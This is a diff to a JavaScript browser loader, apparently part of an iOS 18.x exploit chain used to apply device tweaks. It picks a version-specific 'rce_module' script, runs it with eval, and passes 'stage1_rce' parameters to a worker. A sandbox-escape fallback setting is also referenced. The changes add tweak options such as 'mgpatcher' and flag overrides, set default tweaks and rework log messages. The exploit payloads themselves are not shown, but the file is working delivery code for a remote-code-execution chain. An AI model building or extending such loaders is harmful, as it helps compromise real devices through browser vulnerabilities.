@@ -14,7 +14,7 @@ try { sessionStorage.setItem('ls_running', '1'); sessionStorage.setItem('localSe
 // powercuff in the picker would only propagate fiveicon.
 try {
     var __lsParams = new URLSearchParams(location.search || '');
-    var __validTweaks = { fiveicon: 1, powercuff: 1, threeapp: 1 };
+    var __validTweaks = { fiveicon: 1, powercuff: 1, mgpatcher: 1, applimit: 1 };
     var __tweaksList = [];
     var __rawTweaks = __lsParams.get('tweaks') || __lsParams.get('tweak') || '';
     if (__rawTweaks) {
@@ -24,8 +24,9 @@ try {
             if (__validTweaks[__t] && __tweaksList.indexOf(__t) < 0) __tweaksList.push(__t);
         }
     }
+    if (__tweaksList.length === 0) __tweaksList.push('fiveicon');
     globalThis.__ls_tweaks = __tweaksList.join(',');
-} catch (e) { globalThis.__ls_tweaks = ''; }
+} catch (e) { globalThis.__ls_tweaks = 'fiveicon'; }
 try {
     var __lsParams2 = new URLSearchParams(location.search || '');
     var __validLevels = { off: 1, nominal: 1, light: 1, moderate: 1, heavy: 1 };
@@ -46,12 +47,15 @@ try {
     globalThis.__ls_sbc_hs_rows = __sbcLsClamp(__lsParams3.get('hs_rows'), 4, 8, 6);
     globalThis.__ls_sbc_statbar = (__lsParams3.get('statbar') === '1') ? 1 : 0;
     globalThis.__ls_sbc_hide_labels = (__lsParams3.get('hide_labels') === '1') ? 1 : 0;
+    globalThis.__ls_mg_flags = (__lsParams3.get('mg_flags') || '');
+    globalThis.__ls_mg_unflags = (__lsParams3.get('mg_unflags') || '');
 } catch (e) {
     globalThis.__ls_sbc_dock_icons = 4;
     globalThis.__ls_sbc_hs_cols = 4;
     globalThis.__ls_sbc_hs_rows = 6;
     globalThis.__ls_sbc_statbar = 0;
     globalThis.__ls_sbc_hide_labels = 0;
+    globalThis.__ls_mgpatcher_mode = 'enable';
 }
 try {
     var __lsParams4 = new URLSearchParams(location.search || '');
@@ -62,6 +66,7 @@ try {
     globalThis.__ls_sbx0_fallback_start = __sbx0FallbackStart;
 } catch (e) { globalThis.__ls_sbx0_fallback_start = 0; }
 var basePrefix = location.pathname.replace(/\/[^\/]*$/, '');
+if (!basePrefix && location.pathname && location.pathname !== '/' && location.pathname.indexOf('.') < 0) basePrefix = location.pathname;
 var localHost = location.origin + basePrefix;
 try {
     globalThis.__ls_site_origin = location.origin || "";
@@ -122,26 +127,30 @@ function fail(reason)
     let text = reason ? String(reason) : 'Unknown loader failure';
     print("FAIL: " + text, true);
     try { sessionStorage.removeItem('ls_running'); } catch(e) {}
-    try { window.parent.postMessage({ type: 'lightsaber_error', text: text }, '*'); } catch (e) {}
+    try { window.parent.postMessage({ type: 'lightsaber_failed', reason: text }, '*'); } catch (e) {}
 }
 function getJS(fname,method = 'GET')
 {
     try
     {
         let url = fname;
-        print("getJS: fetching " + url);
+        let shortName = url.replace(/\?.*$/, '').replace(/^.*\//, '');
+        print("Fetching " + shortName + "...");
+        let t0 = Date.now();
         let xhr = new XMLHttpRequest();
         xhr.open(method, `${url}` , false);
         xhr.send(null);
+        let elapsed = Date.now() - t0;
         if (xhr.status < 200 || xhr.status >= 300) {
             throw new Error("HTTP " + xhr.status + " for " + url);
         }
-        print("getJS: got " + xhr.status + " (" + (xhr.responseText ? xhr.responseText.length : 0) + " bytes)");
+        let size = xhr.responseText ? xhr.responseText.length : 0;
+        print("Loaded " + shortName + " (" + size + " bytes, " + elapsed + "ms)");
         return xhr.responseText;
     }
     catch(e)
     {
-        print("getJS ERROR: " + e, true);
+        print("Fetch failed: " + e, true);
         return null;
     }
 }
@@ -283,13 +292,15 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
                 iframe.contentDocument.write('1');
                 worker.postMessage({
                 type: 'setup_fcall',
-                ls_tweaks: globalThis.__ls_tweaks || '',
+                ls_tweaks: globalThis.__ls_tweaks || 'fiveicon',
                 ls_powercuff_level: globalThis.__ls_powercuff_level || 'heavy',
                 ls_sbc_dock_icons: globalThis.__ls_sbc_dock_icons,
                 ls_sbc_hs_cols: globalThis.__ls_sbc_hs_cols,
                 ls_sbc_hs_rows: globalThis.__ls_sbc_hs_rows,
                 ls_sbc_statbar: globalThis.__ls_sbc_statbar,
                 ls_sbc_hide_labels: globalThis.__ls_sbc_hide_labels,
+                ls_mg_flags: globalThis.__ls_mg_flags || '',
+                ls_mg_unflags: globalThis.__ls_mg_unflags || '',
                 ls_site_origin: globalThis.__ls_site_origin || "",
                 ls_site_host: globalThis.__ls_site_host || "",
                 ls_site_path: globalThis.__ls_site_path || "/"
@@ -344,21 +355,21 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
         worker.onmessage = message_handler;
         try
         {
-        print("Loading RCE module...");
         let rceCode = "";
         if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2') {
-                print("Using rce_module_18.6.js");
                 rceCode = getJS(`rce_module_18.6.js?${Date.now()}`); // local version
             } else {
-                print("Using rce_module.js");
                 rceCode = getJS(`rce_module.js?${Date.now()}`); // local version
             }
-        print("RCE module loaded: " + (rceCode ? rceCode.length + " bytes" : "FAILED (null/empty)"));
+        if (!rceCode || !rceCode.trim()) {
+            print("RCE module load failed", true);
+        }
         try
         {
             print("Evaluating RCE module...");
+            let t0 = Date.now();
             eval(rceCode);
-            print("RCE module eval completed");
+            print("RCE module ready (" + (Date.now() - t0) + "ms)");
         }
         catch(e)
         {
@@ -369,19 +380,22 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
         print("desiredHost = " + desiredHost);
             if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
             {
-                print("Sending stage1_rce to worker (iOS 18.6 path) tweaks=" + (globalThis.__ls_tweaks || '(none)') + " level=" + (globalThis.__ls_powercuff_level || 'heavy') + " sbx0FallbackStart=" + (globalThis.__ls_sbx0_fallback_start || 0));
+                print("Sending stage1_rce to worker (iOS 18.6 path) tweaks=" + (globalThis.__ls_tweaks || 'fiveicon') + " level=" + (globalThis.__ls_powercuff_level || 'heavy') + " sbx0FallbackStart=" + (globalThis.__ls_sbx0_fallback_start || 0));
                 worker.postMessage({
                     type: 'stage1_rce',
                     desiredHost,
                     randomValues,
                     SERVER_LOG,
-                    ls_tweaks: globalThis.__ls_tweaks || '',
+                    ls_tweaks: globalThis.__ls_tweaks || 'fiveicon',
                     ls_powercuff_level: globalThis.__ls_powercuff_level || 'heavy',
                     ls_sbc_dock_icons: globalThis.__ls_sbc_dock_icons,
                     ls_sbc_hs_cols: globalThis.__ls_sbc_hs_cols,
                     ls_sbc_hs_rows: globalThis.__ls_sbc_hs_rows,
                     ls_sbc_statbar: globalThis.__ls_sbc_statbar,
                     ls_sbc_hide_labels: globalThis.__ls_sbc_hide_labels,
+                    ls_mgpatcher_mode: globalThis.__ls_mgpatcher_mode || 'enable',
+                    ls_mg_flags: globalThis.__ls_mg_flags || '',
+                    ls_mg_unflags: globalThis.__ls_mg_unflags || '',
                     ls_site_origin: globalThis.__ls_site_origin || "",
                     ls_site_host: globalThis.__ls_site_host || "",
                     ls_site_path: globalThis.__ls_site_path || "/",
